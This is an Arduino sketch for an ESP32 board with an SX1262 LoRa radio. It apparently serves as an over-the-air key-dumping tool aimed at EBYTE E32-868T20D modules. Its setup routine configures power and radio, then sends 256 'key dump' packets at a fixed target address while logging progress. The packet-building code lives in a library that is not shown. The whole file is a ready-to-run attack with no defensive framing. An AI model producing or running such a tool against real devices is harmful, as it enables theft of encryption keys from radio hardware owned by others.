#include <Arduino.h>
#include <XPowersLib.h>
#include <RadioLib.h>
#include <E32-868T20D.h>

// -------------------------- Configuration -------------------------- //

#define LORA_CS_PIN                 18
#define LORA_DIO1_PIN               33
#define LORA_RST_PIN                23
#define LORA_BUSY_PIN               32

// EBYTE E32-868T20D parameters
#define E32_CHANNEL                 0x09
#define E32_ADDRESS                 0x1310
#define E32_BASE_FREQUENCY_MHZ      862
#define E32_BANDWIDTH_KHZ           500
#define E32_SPREADING_FACTOR        11
#define E32_CODING_RATE_DENOM       5

// ------------------------------------------------------------------- //

XPowersLibInterface * pmu = new XPowersAXP2101(Wire);
SX1262 lora = new Module(LORA_CS_PIN, LORA_DIO1_PIN, LORA_RST_PIN, LORA_BUSY_PIN);
E32_868T20D e32;

void beginPMU() {
    pmu->init();
    // Protect the ESP32 power channel from being disabled to avoid bricking the board
    pmu->setProtectedChannel(XPOWERS_DCDC1);
    // Disable all power outputs, they will be enabled on each module's begin() function
    pmu->disablePowerOutput(XPOWERS_DCDC2);
    pmu->disablePowerOutput(XPOWERS_DCDC3);
    pmu->disablePowerOutput(XPOWERS_DCDC4);
    pmu->disablePowerOutput(XPOWERS_DCDC5);
    pmu->disablePowerOutput(XPOWERS_ALDO1);
    pmu->disablePowerOutput(XPOWERS_ALDO2);
    pmu->disablePowerOutput(XPOWERS_ALDO3);
    pmu->disablePowerOutput(XPOWERS_ALDO4);
    pmu->disablePowerOutput(XPOWERS_BLDO1);
    pmu->disablePowerOutput(XPOWERS_BLDO2);
    pmu->disablePowerOutput(XPOWERS_DLDO1);
    pmu->disablePowerOutput(XPOWERS_DLDO2);
    pmu->disablePowerOutput(XPOWERS_VBACKUP);
    // Set the battery charging current to 1A
    pmu->setChargerConstantCurr(XPOWERS_AXP2101_CHG_CUR_1000MA);
}

void beginLora() {
    pmu->setPowerChannelVoltage(XPOWERS_ALDO2, 3300);
    pmu->enablePowerOutput(XPOWERS_ALDO2);
    lora.begin(E32_BASE_FREQUENCY_MHZ + E32_CHANNEL, E32_BANDWIDTH_KHZ, E32_SPREADING_FACTOR, E32_CODING_RATE_DENOM);
}

void setup() {
    Serial.begin(115200);
    beginPMU();
    beginLora();

    Serial.println("Dumping keys...");
    uint8_t packet[64];
    size_t len;
    for (int i = 0; i <= 0xFF; i++) {
        e32.generateKeyDumpPacket(E32_ADDRESS, (uint8_t)i, packet, &len);
        lora.transmit(packet, len);
        Serial.print("Completed: ");
        Serial.print(i+1); Serial.print("/"); Serial.println(256);
        delay(100);
    }
    Serial.println("Done!");
}

void loop() {}
